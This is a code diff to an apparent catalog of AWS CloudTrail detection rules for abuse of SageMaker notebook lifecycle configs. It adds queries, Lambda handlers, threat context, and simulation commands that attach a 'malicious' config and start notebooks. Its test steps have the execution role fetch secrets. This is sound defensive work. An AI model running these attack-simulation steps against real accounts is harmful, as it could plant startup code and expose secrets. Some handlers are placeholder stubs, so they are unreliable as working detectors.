+        return {"matched": False}
+
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-102",
+            "title": "Lifecycle Config Associated to Notebook Instance",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "notebook_name": request.get("notebookInstanceName"),
+            "lifecycle_config_name": request.get("lifecycleConfigName"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "UpdateNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target", lifecycleConfigName: "malicious-config" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the notebook and lifecycle config.", "Verify if association was authorized.", "Check for StartNotebookInstance shortly after."],
-    testingSteps: ["Update notebook instance with lifecycle config.", "Verify detection triggers."],
+    investigationSteps: ["Identify the notebook, attached lifecycle config, and actor performing the association.", "Verify whether that notebook was expected to reference the lifecycle config and whether the association change was approved.", "Check for notebook start or restart activity soon after the association."],
+    testingSteps: ["Create or update a test notebook instance with a lifecycle config attached.", "Verify CloudTrail records both the notebook name and lifecycle config name.", "Run the detector and confirm it only fires when a lifecycle config is actually associated to a notebook instance."],
+    lifecycle: {
+      whyItMatters: "A lifecycle config becomes operationally significant once it is attached to a notebook. At that point, the startup script has a live execution path into a SageMaker environment.",
+      threatContext: {
+        attackerBehavior: "An attacker may attach a malicious or modified lifecycle config to a notebook to prepare code execution when the notebook next starts.",
+        realWorldUsage: "This is attractive because it converts a configuration artifact into a live startup mechanism without immediately running code.",
+        whyItMatters: "Association is a stronger signal than lifecycle-config mutation alone because it shows the config is being put into position for execution.",
+        riskAndImpact: "If missed, defenders may not realize that a risky lifecycle config has become active on a notebook environment.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SageMaker", "Notebook inventory and lifecycle-config mappings"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "sourceIPAddress"],
+        loggingRequirements: ["CreateNotebookInstance and UpdateNotebookInstance events must be ingested.", "The detector should evaluate whether lifecycleConfigName is present and non-empty.", "Notebook start events should be available for later execution-path correlation."],
+        limitations: ["Association alone does not guarantee the notebook has started yet.", "Some approved notebook provisioning workflows will legitimately attach lifecycle configs.", "The notebook and config risk still require enrichment for prioritization."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.notebookInstanceName", normalizedPath: "aws.sagemaker.notebook.name", notes: "Notebook receiving the lifecycle config" },
+          { rawPath: "requestParameters.lifecycleConfigName", normalizedPath: "aws.sagemaker.lifecycle_config.name", notes: "Lifecycle config being attached" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor attaching the config to the notebook" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["change"], action: "UpdateNotebookInstance", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { sagemaker: { notebook: { name: "target" }, lifecycle_config: { name: "malicious-config" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Notebook Criticality", description: "Classify the notebook by environment, owner, and data sensitivity.", examples: ["prod data-science notebook", "ephemeral sandbox notebook"], falsePositiveReduction: "Raises urgency when risky configs are attached to important notebooks." },
+        { dimension: "Lifecycle Config Reputation", description: "Determine whether the attached config is approved, expected, or newly introduced.", examples: ["approved bootstrap config", "unknown recently modified config"], falsePositiveReduction: "Separates known-good startup logic from suspicious attachment." },
+        { dimension: "Execution Readiness", description: "Track whether the notebook is started or restarted soon after the association.", examples: ["start within 5 minutes", "attached but dormant"], falsePositiveReduction: "Improves confidence that the attached code is about to run." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect the operational attachment of a lifecycle config to a SageMaker notebook. It should match notebook create or update events only when `lifecycleConfigName` is set, because that is the point where startup logic becomes executable on the notebook.",
+        conditions: ["eventSource equals sagemaker.amazonaws.com", "eventName equals CreateNotebookInstance or UpdateNotebookInstance", "requestParameters.lifecycleConfigName exists and is not empty"],
+        tuningGuidance: "1. Require an actual lifecycle-config attachment. 2. Resolve notebook criticality and config approval state. 3. Correlate with notebook start or post-start sensitive activity for higher-confidence detections.",
+        whenToFire: "Fire when a lifecycle config is associated with a notebook instance, especially on sensitive notebooks or when the config is newly changed or unapproved.",
+      },
+      simulationCommand: "aws sagemaker update-notebook-instance --notebook-instance-name target --lifecycle-config-name demo-config",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium depending on notebook provisioning patterns",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because notebook start often follows shortly after association.",
+        considerations: ["This is the operational handoff rule for SageMaker lifecycle configs.", "Notebook inventory and config approval state are key enrichments."],
+      },
+    },
   },
   {
     id: "det-103",
-    title: "Suspicious Lifecycle Config Activity by Unexpected Actor",
-    description: "Detects lifecycle config creation/update/association by identities that should not manage SageMaker notebook startup logic. Suspicious: IAM users outside ML platform admin, application roles, unexpected assumed roles.",
+    title: "SageMaker Lifecycle Management Outside Authorized ML Platform Path",
+    description: "Detects lifecycle-config creation, update, or notebook association by identities outside approved SageMaker administration workflows. This should rely on explicit actor authorization and automation provenance rather than role-name substring allowlists.",
     awsService: "SageMaker",
     relatedServices: [],
     severity: "High",
@@ -12570,42 +13471,108 @@ detection:
       - UpdateNotebookInstanceLifecycleConfig
       - CreateNotebookInstance
       - UpdateNotebookInstance
-  filter_known:
-    userIdentity.arn|contains:
-      - '/role/MLPlatform'
-      - '/role/SageMaker'
-      - '/role/Admin'
-      - '/role/Platform'
-  condition: selection and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstanceLifecycleConfig OR eventName=CreateNotebookInstance OR eventName=UpdateNotebookInstance)
-| where NOT (like(userIdentity.arn, "%/role/MLPlatform%") OR like(userIdentity.arn, "%/role/SageMaker%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%"))
-| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress`,
-      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress
+| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress`,
+      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 'sagemaker.amazonaws.com'
   AND eventName IN ('CreateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstanceLifecycleConfig', 'CreateNotebookInstance', 'UpdateNotebookInstance')
-  AND userIdentity.arn NOT LIKE '%/role/MLPlatform%'
-  AND userIdentity.arn NOT LIKE '%/role/SageMaker%'
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName
 | filter eventSource = "sagemaker.amazonaws.com"
 | filter eventName in ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "CreateNotebookInstance", "UpdateNotebookInstance"]
-| filter userIdentity.arn not like /\\/role\\/(MLPlatform|SageMaker|Admin|Platform)/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "CreateNotebookInstance", "UpdateNotebookInstance"] } }, null, 2),
+      lambda: `"""
+SageMaker Lifecycle Management Outside Authorized ML Platform Path
+Trigger: EventBridge rule matching SageMaker lifecycle-config and notebook-association changes.
+Use for: Real-time authorization checks on SageMaker startup-logic management.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "sagemaker.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "CreateNotebookInstance", "UpdateNotebookInstance"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-sagemaker-lifecycle-manager-check",
+        "alert": {
+            "rule_id": "det-103",
+            "title": "SageMaker Lifecycle Management Outside Authorized ML Platform Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.notebookInstanceLifecycleConfigName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "UpdateNotebookInstance", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { notebookInstanceName: "target", lifecycleConfigName: "malicious" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for SageMaker lifecycle management.", "Update allowlist if legitimate."],
-    testingSteps: ["As a non-ML-platform role, create or update lifecycle config.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and any automation provenance behind the lifecycle-config or notebook-association change.", "Verify whether this identity is explicitly approved to manage SageMaker startup logic in the target environment.", "Determine whether the request came from a trusted ML platform workflow or from an unexpected principal."],
+    testingSteps: ["As an identity outside the approved ML platform set, create or update a lifecycle config or attach one to a notebook.", "Verify CloudTrail records the actor and SageMaker object context.", "Run the detector and confirm it uses explicit actor authorization instead of ML role-name text matches."],
+    lifecycle: {
+      whyItMatters: "SageMaker lifecycle management should come from a narrow set of trusted platform or automation identities. When an unapproved actor changes startup logic, the event is a strong persistence or privilege-enablement signal.",
+      threatContext: {
+        attackerBehavior: "An attacker may use a compromised app role, developer identity, or unexpected assumed role to change SageMaker startup behavior and establish execution on notebooks.",
+        realWorldUsage: "This is practical because lifecycle-config management looks administrative and may blend in with normal notebook operations without strong context.",
+        whyItMatters: "Authorization context and workflow provenance matter much more than role-name substrings.",
+        riskAndImpact: "If missed, unauthorized identities can establish durable startup-code execution paths in SageMaker environments.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SageMaker", "Authorized ML platform and automation principal inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.notebookInstanceLifecycleConfigName", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "sourceIPAddress"],
+        loggingRequirements: ["Lifecycle-config and notebook-association events must be ingested with full actor context.", "The environment should maintain exact principals approved to manage SageMaker startup logic.", "Trusted IaC or ML platform workflow provenance should be modeled explicitly."],
+        limitations: ["Without actor inventories the rule becomes weak anomaly logic.", "Some emergency or out-of-band ML platform operations may be manual.", "CloudTrail does not show whether the lifecycle script content itself is malicious."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor managing SageMaker lifecycle behavior" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Lifecycle-config or notebook-association change type" },
+          { rawPath: "requestParameters.notebookInstanceLifecycleConfigName", normalizedPath: "aws.sagemaker.lifecycle_config.name", notes: "Lifecycle config target where available" },
+          { rawPath: "requestParameters.notebookInstanceName", normalizedPath: "aws.sagemaker.notebook.name", notes: "Notebook target where available" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["change"], action: "UpdateNotebookInstance", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          aws: { sagemaker: { notebook: { name: "target" }, lifecycle_config: { name: "malicious" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized Lifecycle Managers", description: "Exact inventory of identities allowed to create, modify, or attach lifecycle configs.", examples: ["ML platform admin role", "approved provisioning pipeline"], falsePositiveReduction: "Replaces brittle role-name allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the request came from a trusted IaC, platform broker, or approved automation path.", examples: ["Terraform apply", "manual unknown session"], falsePositiveReduction: "Separates expected automation from suspicious manual changes." },
+        { dimension: "Environment Scope", description: "Model which notebooks or environments each authorized actor may manage.", examples: ["dev notebooks only", "prod ML platform team"], falsePositiveReduction: "Prevents broad admin allowlists from hiding out-of-scope changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect SageMaker lifecycle-management activity outside approved ML platform paths. It should match lifecycle-config and notebook-association changes, resolve the actor and workflow provenance, and then check whether that identity is explicitly allowed to manage startup logic in the target environment.",
+        conditions: ["eventSource equals sagemaker.amazonaws.com", "eventName equals CreateNotebookInstanceLifecycleConfig, UpdateNotebookInstanceLifecycleConfig, CreateNotebookInstance, or UpdateNotebookInstance", "actor is not in the approved SageMaker lifecycle-manager inventory or actor is outside approved environment scope or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model actor-to-environment scope, not only global ML admin allowlists. 3. Treat IaC and platform automation as explicit approved paths with auditability.",
+        whenToFire: "Fire when SageMaker lifecycle-management APIs are used by an identity outside approved ML platform workflows.",
+      },
+      simulationCommand: "aws sagemaker update-notebook-instance --notebook-instance-name target --lifecycle-config-name malicious --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and workflow provenance; high with role-name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor and environment inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because unauthorized startup-logic changes are immediately actionable.",
+        considerations: ["This is the actor-centric SageMaker lifecycle detector.", "Actor inventory, workflow provenance, and environment scope are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-104",
-    title: "Lifecycle Config Association Followed by Notebook Start or Update",
-    description: "High-confidence execution preparation: lifecycle config created/updated or notebook updated to reference lifecycle config, then notebook start/restart shortly afterward. Models the execution path.",
+    title: "Lifecycle Config Prepared Then Notebook Started",
+    description: "High-confidence execution-readiness detection for SageMaker. This should correlate lifecycle-config mutation or notebook association with a later notebook start over the same notebook or attached config lineage, not just same-actor co-occurrence.",
     awsService: "SageMaker",
     relatedServices: [],
     severity: "High",
@@ -12627,19 +13594,19 @@ detection:
   selection_start:
     eventSource: sagemaker.amazonaws.com
     eventName: StartNotebookInstance
-  condition: 1 of selection_*
+  condition: selection_config
 level: high
-# Full correlation (notebook/actor, 30 min) requires SIEM.`,
+# Full correlation requires notebook or lifecycle-config linkage plus ordered stage progression.`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstance OR eventName=StartNotebookInstance)
 | eval actor=userIdentity.arn
-| eval notebook=coalesce(requestParameters.notebookInstanceName, requestParameters.notebookInstanceLifecycleConfigName)
+| eval notebook=coalesce(requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, requestParameters.notebookInstanceLifecycleConfigName)
 | eval is_config=if(eventName IN ("CreateNotebookInstanceLifecycleConfig","UpdateNotebookInstanceLifecycleConfig","UpdateNotebookInstance"), 1, 0)
 | eval is_start=if(eventName="StartNotebookInstance", 1, 0)
 | transaction actor maxspan=30m
 | where mvcount(mvfilter(is_config=1))>0 AND mvcount(mvfilter(is_start=1))>0
 | table _time, actor, eventName, notebook`,
       cloudtrail: `WITH config_evt AS (
-  SELECT userIdentity.arn AS actor, eventTime AS config_time
+  SELECT userIdentity.arn AS actor, eventTime AS config_time, requestParameters.notebookInstanceName AS notebook_name, requestParameters.lifecycleConfigName AS lifecycle_name, requestParameters.notebookInstanceLifecycleConfigName AS config_name
   FROM cloudtrail_logs
   WHERE eventSource = 'sagemaker.amazonaws.com'
     AND eventName IN ('CreateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstance')
@@ -12650,7 +13617,7 @@ start_evt AS (
   WHERE eventSource = 'sagemaker.amazonaws.com'
     AND eventName = 'StartNotebookInstance'
 )
-SELECT c.actor, c.config_time, s.start_time, s.notebookInstanceName
+SELECT c.actor, c.config_time, c.notebook_name, c.lifecycle_name, c.config_name, s.start_time, s.notebookInstanceName
 FROM config_evt c
 JOIN start_evt s ON c.actor = s.actor
   AND s.start_time > c.config_time
@@ -12663,16 +13630,94 @@ ORDER BY c.config_time DESC`,
 | filter cnt >= 2
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["StartNotebookInstance"] } }, null, 2),
+      lambda: `"""
+Lifecycle Config Prepared Then Notebook Started
+Trigger: EventBridge rule matching lifecycle-config changes and notebook starts.
+Use for: Stateful correlation of startup-script preparation into notebook execution.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "sagemaker.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "UpdateNotebookInstance", "StartNotebookInstance"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-sagemaker-lifecycle-prep-plus-start-correlation",
+        "alert": {
+            "rule_id": "det-104",
+            "title": "Lifecycle Config Prepared Then Notebook Started",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "StartNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify config/association and StartNotebookInstance sequence.", "Verify if start was authorized.", "Check notebook execution role for sensitive API use."],
-    testingSteps: ["Update notebook with lifecycle config, then StartNotebookInstance within 30 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Trace the sequence from lifecycle-config creation or notebook association into `StartNotebookInstance` for the same notebook or attached config lineage.", "Verify whether the notebook start was expected after the config change and whether the actor was authorized for both stages.", "Check the notebook execution role and post-start activity for sensitive API use."],
+    testingSteps: ["Create or update a lifecycle config, attach it to a notebook, and then start the notebook within 30 minutes.", "Verify CloudTrail preserves enough notebook and config context to connect the steps.", "Run the detector and confirm it requires ordered execution-path correlation rather than simple actor-only grouping."],
+    lifecycle: {
+      whyItMatters: "A lifecycle config only becomes dangerous when it is likely to execute. Notebook start shortly after config preparation is one of the clearest signals that startup code is being operationalized.",
+      threatContext: {
+        attackerBehavior: "An attacker may modify or attach a lifecycle config and then quickly start the notebook to trigger execution of the injected startup logic.",
+        realWorldUsage: "This is attractive because it turns a control-plane config change into actual code execution inside a managed ML environment.",
+        whyItMatters: "The strongest signal is the ordered path from config preparation to notebook start, not the presence of either event independently.",
+        riskAndImpact: "If missed, defenders may see lifecycle changes and notebook starts as unrelated operational noise instead of a single execution chain.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SageMaker", "Notebook-to-lifecycle-config mappings"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "requestParameters.notebookInstanceLifecycleConfigName", "sourceIPAddress"],
+        loggingRequirements: ["Lifecycle-config changes, notebook association, and notebook start events must all be ingested.", "The detector should carry notebook or lifecycle-config linkage across stages.", "Notebook execution-role context should be available for downstream correlation."],
+        limitations: ["Actor-only joins are weaker than notebook or config linkage.", "Notebook starts may be scheduled or expected in some pipelines.", "Lifecycle-config create events without later association may be less meaningful."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.notebookInstanceName", normalizedPath: "aws.sagemaker.notebook.name", notes: "Notebook being prepared or started" },
+          { rawPath: "requestParameters.lifecycleConfigName", normalizedPath: "aws.sagemaker.lifecycle_config.name", notes: "Lifecycle config attached to the notebook where available" },
+          { rawPath: "requestParameters.notebookInstanceLifecycleConfigName", normalizedPath: "aws.sagemaker.lifecycle_config.name", notes: "Lifecycle config mutated before association" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Preparation or start stage in the execution path" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["change"], action: "UpdateNotebookInstance", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { sagemaker: { notebook: { name: "target" }, lifecycle_config: { name: "malicious-config" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Notebook and Config Linkage", description: "Track how a lifecycle-config mutation relates to a notebook that is later started.", examples: ["malicious-config -> target notebook -> StartNotebookInstance"], falsePositiveReduction: "Prevents unrelated SageMaker events by the same actor from forming a false chain." },
+        { dimension: "Execution Role Risk", description: "Resolve the notebook execution role and what privileges it has when the notebook starts.", examples: ["access to secrets", "broad S3 access"], falsePositiveReduction: "Raises confidence when the started notebook can materially impact the environment." },
+        { dimension: "Operational Context", description: "Determine whether the start sequence matches expected notebook scheduling or maintenance workflows.", examples: ["scheduled team notebook start", "manual out-of-band start"], falsePositiveReduction: "Separates normal notebook operations from suspicious execution enablement." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model an execution-readiness chain in SageMaker: lifecycle-config creation, update, or notebook association is followed by notebook start for the same notebook or config lineage. It should require ordered sequence and object linkage wherever possible.",
+        conditions: ["first event is CreateNotebookInstanceLifecycleConfig, UpdateNotebookInstanceLifecycleConfig, or UpdateNotebookInstance with lifecycle-config context", "second event is StartNotebookInstance for the same notebook or linked lifecycle-config path", "start occurs within 30 minutes"],
+        tuningGuidance: "1. Correlate on notebook or lifecycle-config linkage, not only actor. 2. Require order. 3. Escalate when the notebook execution role is powerful or the actor is unauthorized for SageMaker lifecycle management.",
+        whenToFire: "Fire when SageMaker startup-code preparation is quickly followed by a notebook start that can execute the config.",
+      },
+      simulationCommand: "aws sagemaker update-notebook-instance --notebook-instance-name target --lifecycle-config-name demo-config && aws sagemaker start-notebook-instance --notebook-instance-name target",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with notebook linkage and operational context; medium with actor-only joins",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because notebook execution may follow quickly after preparation.",
+        considerations: ["This is the execution-readiness rule for SageMaker lifecycle abuse.", "Notebook or config linkage is the key implementation dependency."],
+      },
+    },
   },
   {
     id: "det-105",
-    title: "Lifecycle Config Injection Followed by Sensitive Downstream Activity",
-    description: "High-confidence privilege escalation: lifecycle config association/notebook start correlated with follow-on GetSecretValue, KMS decrypt, S3 GetObject, IAM policy changes, AssumeRole by notebook execution role or same actor.",
+    title: "SageMaker Lifecycle Path Followed by Sensitive Downstream Activity",
+    description: "High-confidence post-execution detection for SageMaker. This should correlate lifecycle-config association or notebook start with later sensitive API activity from the same operator identity or notebook execution role path.",
     awsService: "SageMaker",
     relatedServices: ["Secrets Manager", "KMS", "S3", "IAM", "STS"],
     severity: "Critical",
@@ -12698,9 +13743,9 @@ detection:
       - CreateAccessKey
       - PutUserPolicy
       - AttachRolePolicy
-  condition: 1 of selection_*
+  condition: selection_sagemaker
 level: critical
-# Full correlation (actor/notebook role, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence plus stable actor or execution-role identity.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=sagemaker.amazonaws.com AND eventName IN ("UpdateNotebookInstance","StartNotebookInstance")) OR (eventName=GetSecretValue OR eventName=Decrypt OR eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=PutUserPolicy OR eventName=AttachRolePolicy))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -12733,18 +13778,99 @@ ORDER BY s.sm_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["UpdateNotebookInstance", "StartNotebookInstance"] } }, null, 2),
+      lambda: `"""
+SageMaker Lifecycle Path Followed by Sensitive Downstream Activity
+Trigger: EventBridge rule matching notebook lifecycle-path events.
+Use for: Correlation from SageMaker startup-code execution path to later sensitive cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "sagemaker.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"UpdateNotebookInstance", "StartNotebookInstance"}:
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-sagemaker-lifecycle-plus-sensitive-activity-correlation",
+        "alert": {
+            "rule_id": "det-105",
+            "title": "SageMaker Lifecycle Path Followed by Sensitive Downstream Activity",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "notebook_name": request.get("notebookInstanceName"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "StartNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify SageMaker activity and sensitive API sequence.", "Verify if notebook execution role performed expected vs malicious API calls.", "Check lifecycle config content."],
-    testingSteps: ["Start notebook with malicious lifecycle config, then have execution role call GetSecretValue.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the lifecycle-path event, target notebook, and any linked execution role.", "Review ordered follow-on activity such as secrets access, decrypt, role assumption, access-key creation, or IAM mutation within 30 minutes.", "Determine whether the later activity came from the same operator identity or the notebook execution role after startup."],
+    testingSteps: ["Associate a lifecycle config to a notebook, start the notebook, and have the notebook execution role call `GetSecretValue` or `AssumeRole` within 30 minutes.", "Verify both the SageMaker event and later sensitive API calls appear in CloudTrail.", "Run the detector and confirm it requires ordered post-start correlation rather than loose same-actor aggregation."],
+    lifecycle: {
+      whyItMatters: "A lifecycle-config path becomes highly suspicious when it is followed by sensitive cloud activity. This sequence is one of the clearest indicators that startup-code execution was used to operationalize access or extract secrets.",
+      threatContext: {
+        attackerBehavior: "An attacker may attach or trigger a lifecycle config and then use the notebook or its execution role to access secrets, decrypt data, assume roles, or mutate IAM permissions.",
